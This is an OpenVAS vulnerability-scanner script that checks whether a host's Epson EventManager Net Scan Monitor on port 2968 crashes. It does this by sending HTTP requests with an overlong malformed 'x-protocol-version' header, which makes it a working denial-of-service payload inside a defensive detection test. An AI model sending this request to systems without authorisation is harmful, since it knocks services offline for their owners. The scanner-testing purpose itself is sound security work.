###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_epson_event_manager_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Epson EventManager 'x-protocol-version' Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial of service condition.
  Impact Level: Application";
tag_affected = "Epson EventManager 2.50 and prior";
tag_insight = "The flaw is caused  due to an error in the Net Scan Monitor component when
  handling HTTP requests. This can be exploited to cause a crash via a
  specially crafted request sent to TCP port 2968.";
tag_solution = "No solution or patch is available as of 28th March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.epson.com/";
tag_summary = "This host is running Epson EventManager and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(902824);
  script_version("$Revision: 12 $");
  script_bugtraq_id(52511);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-28 15:15:15 +0530 (Wed, 28 Mar 2012)");
  script_name("Epson EventManager 'x-protocol-version' Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/80132");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48382");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74033");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18602");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/48382");
  script_xref(name : "URL" , value : "http://aluigi.org/adv/eeventmanager_1-adv.txt");

  script_description(desc);
  script_summary("Check if Epson EventManager is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_require_ports("Services/www", 2968);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
res = "";
req1 = "";
req2 = "";
host = "";
port = 0;

## Net Scan Monitor Port
port = 2968;

## Check Port Status
if(!get_port_state(port)){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(!host){
  exit(0);
}

## Send proper Get request and check the response
req1 = string( 'GET / HTTP/1.1\r\n',
               'x-uid: 0000000000000000000\r\n',
               'x-protocol-version : 1.00\r\n',
               'x-protocol-name: Epson Network Service Protocol\r\n\r\n' );

res = http_send_recv(port:port, data:req1);

## Confirm the application before trying exploit
if(!res || "Server : Epson Net Scan Monitor" >!< res){
  exit(0);
}

## Construct Attack Request
req2 = ereg_replace(pattern:"x-protocol-version : 1.00", string: req1,
       replace: "x-protocol-version: 1.000000000000000000000000000000");

## Send Attack Requests
res = http_send_recv(port:port, data:req2);
res = http_send_recv(port:port, data:req2);

## Wait
sleep(3);

## Confirm the Vulnerability
if(!res)
{
  ## Send Normal Get request and check the response
  res = http_send_recv(port:port, data:req1);
  if(!res){
    security_hole(port);
  }
}
